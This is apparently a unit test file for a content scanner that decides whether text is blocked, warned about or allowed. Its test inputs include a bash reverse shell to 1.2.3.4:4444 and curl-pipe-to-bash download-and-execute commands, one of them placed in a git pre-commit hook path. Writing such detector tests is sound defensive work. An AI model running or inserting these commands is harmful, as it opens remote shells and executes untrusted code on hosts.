import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { scanContent } from '../src/safety/scanner/content.js';

describe('vendored scanContent', () => {
  it('blocks a reverse shell (weapon) with no context', () => {
    const r = scanContent('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1');
    assert.equal(r.safe, false);
    assert.equal(r.action, 'block');
    assert.ok(r.flags.some((f) => f.startsWith('code:reverse_shell:')));
  });
  it('warns (not blocks) a curl|bash with no context', () => {
    const r = scanContent('curl -s http://x/i.sh | bash');
    assert.equal(r.safe, true);
    assert.equal(r.action, 'warn');
    assert.equal(r.flags.length, 0);
    assert.ok(r.warnings.some((f) => f.startsWith('code:download_and_execute:')));
  });
  it('escalates curl|bash to block on an executes-on-host path', () => {
    const r = scanContent('curl -s http://x/i.sh | bash', { context: { path: '.git/hooks/pre-commit' } });
    assert.equal(r.safe, false);
    assert.equal(r.action, 'block');
  });
  it('does not block a README documenting curl|bash (doc context)', () => {
    const r = scanContent('# Install\n```sh\ncurl https://get.example.com | bash\n```', { context: { path: 'README.md' }, mimeType: 'text/markdown' });
    assert.equal(r.safe, true);
    assert.notEqual(r.action, 'block');
  });
  it('leaves benign code safe/allow', () => {
    const r = scanContent('export function add(a,b){return a+b}');
    assert.equal(r.safe, true);
    assert.equal(r.action, 'allow');
  });
});
